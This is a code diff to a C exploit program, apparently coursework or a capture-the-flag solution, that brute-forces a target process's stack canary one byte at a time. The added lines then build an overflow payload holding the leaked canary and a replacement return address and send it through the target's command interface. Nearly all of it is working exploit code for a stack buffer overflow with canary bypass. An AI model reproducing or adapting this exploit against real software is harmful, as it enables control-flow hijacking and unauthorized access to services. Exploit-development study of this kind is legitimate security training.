@@ -26,8 +26,9 @@ int main() {
     for(int i = 1; i <= 8; i++) {
         current_byte = 0x00;
         while(1) {
-            // fprintf(stderr, "Attach Now!");
-	    //	    getchar();
+            // fprintf(stderr, "Debug Now!");
+	        // getchar();
+
             // Buffer Size + DB + Cred + Canary - Password
             unsigned explsz = auth_db_cred_dist + 8 + 8 + 8 - 8;
             void* *expl = (void**)malloc(explsz);
@@ -61,11 +62,35 @@ int main() {
             current_byte = current_byte + 1;
         }
     }
-    fprintf(stderr, "Canary Computed: %016lx", stack_canary);
+    fprintf(stderr, "\n\n---------------------------------\n");
+    fprintf(stderr, "Canary Computed: %016lx\n", stack_canary);
+    fprintf(stderr, "---------------------------------\n\n");
+    
+    // Buffer Size + DB + Cred + Canary + RBP + Return Addr - Password
+    unsigned explsz = auth_db_cred_dist + 8 + 8 + 8 + 8 + 8 - 8;
+    void* *expl = (void**)malloc(explsz);
+    memset((void*)expl, 0x00, explsz);
 
-    // unsigned explsz = auth_db_cred_dist + 8 - 8 + 8;
-    // void* *expl = (void**)malloc(explsz);
-    // memset((void*)expl, 0x00, explsz);
+    expl[explsz/sizeof(void*)-3] = (void*)stack_canary;
+    expl[explsz/sizeof(void*)-1] = 0x00000000000016c0;
+
+    fprintf(stderr, "Attach GDB now if you need to!");
+	getchar();
+
+    put_str("p 1234567\n");
+    send();
+    get_formatted("%*s");
+
+    put_str("u ");
+    put_bin((char*)expl, explsz - 6);
+    put_str("\n");
+    send();
+    get_formatted("%*s");
+    put_str("l \n");
+    send();
+
+    usleep(100000);
+    get_formatted("%*s");
 
     kill(pid, SIGINT);
 
